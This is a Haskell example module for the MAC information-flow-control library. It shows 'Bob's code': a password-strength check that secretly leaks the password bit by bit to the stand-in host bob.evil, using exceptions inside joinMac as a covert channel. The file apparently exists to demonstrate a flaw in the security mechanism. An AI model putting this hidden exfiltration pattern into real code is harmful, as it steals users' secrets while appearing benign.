{-# LANGUAGE FlexibleContexts    #-}
{-# LANGUAGE Safe                #-}
{-# LANGUAGE ScopedTypeVariables #-}

module Examples.Bob1 where

import           Data.List
import           Data.Maybe

import           Control.Monad
import           Mac.Control
import           Mac.Labeled
import           Mac.Lattice
import           Mac.MAC

import           Control.Exception
import           Mac.Exception

import           Data.List.Split
import           Examples.MacWget

import           Data.Bits
import           Data.Char

-- Bob's code
commonPass :: Labeled H String -> Mac L (Labeled H Bool)
commonPass lpass = do
    attack lpass
    str <- wgetMac "http://www.openwall.com/passwords/wordlists/password-2011.lst"
    let lines = filter (not . null) (linesBy (== '\n') str)
    let words = filter (not . (== '#') . head) lines
    joinMac $ do
        pass <- unlabel lpass
        return $ isJust $ find (== pass) words

charToByte :: Labeled H Char -> Mac L [Labeled H Bool]
charToByte lchar = do
    forM [0 .. 8] g
  where
    g n = joinMac $ do
        fix (labelOf lchar)
        char <- unlabel lchar
        return $ testBit (digitToInt char) n

toChars :: Labeled H String -> Mac L [Labeled H Char]
toChars lstr = do
    forM [0 .. 39] g
  where
    g n = joinMac $ do
        fix (labelOf lstr)
        str <- unlabel lstr
        return $
            if (n >= length str)
                then (chr 0)
                else str !! n

attack :: Labeled H String -> Mac L ()
attack lpass =
    toChars lpass
        >>= mapM charToByte
        >>= mapM leakByte
        >> return ()

leakByte :: [Labeled H Bool] -> Mac L ()
leakByte lbools = forM (zip lbools [0 .. 7]) (uncurry leakBit) >> return ()

leakBit :: Labeled H Bool -> Int -> Mac L ()
leakBit lbool n = do
    wgetMac $ "http://bob.evil/bit=" ++ show n
    catchMac
        (crashOnTrue lbool)
        (\(e :: SomeException) -> wgetMac "http://bob.evil/set=1" >> return ())

crashOnTrue :: Labeled H Bool -> Mac L ()
crashOnTrue lbool = do
    joinMac $ do
        fix (labelOf lbool)
        bool <- unlabel lbool
        when bool $ error "crash!"
    wgetMac $ "http://bob.evil/set=0"
    return ()
